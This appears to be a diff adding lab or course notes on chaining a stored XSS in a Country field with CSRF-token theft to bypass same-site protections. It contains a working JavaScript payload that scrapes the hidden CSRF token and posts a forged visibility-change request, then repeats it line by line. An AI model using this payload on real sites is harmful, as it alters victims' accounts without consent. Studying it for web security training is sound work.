@@ -1,0 +1,50 @@
+The application features same origin/same site protections as anti-CSRF measures (through a server configuration - you won't be able to actually spot it)
+The application's Country field is vulnerable to stored XSS attacks (like we saw in the Cross-Site Scripting (XSS) section)
+===============================
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/app/change-visibility',true);
+req.send();
+function handleResponse(d) {
+    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/app/change-visibility', true);
+    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    changeReq.send('csrf='+token+'&action=change');
+};
+</script>
+===============================
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/app/change-visibility',true);
+req.send();
+===============================
+req.onload = handleResponse;
+===============================
+req.open('get','/app/change-visibility',true);
+===============================
+req.send();
+===============================
+function handleResponse(d) {
+    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/app/change-visibility', true);
+    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    changeReq.send('csrf='+token+'&action=change');
+};
+===============================
+var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
+===============================
+var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/app/change-visibility', true);
+    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    changeReq.send('csrf='+token+'&action=change');
+===============================
+changeReq.open('post', '/app/change-visibility', true);
+===============================
+changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+===============================
+changeReq.send('csrf='+token+'&action=change');
+===============================
+
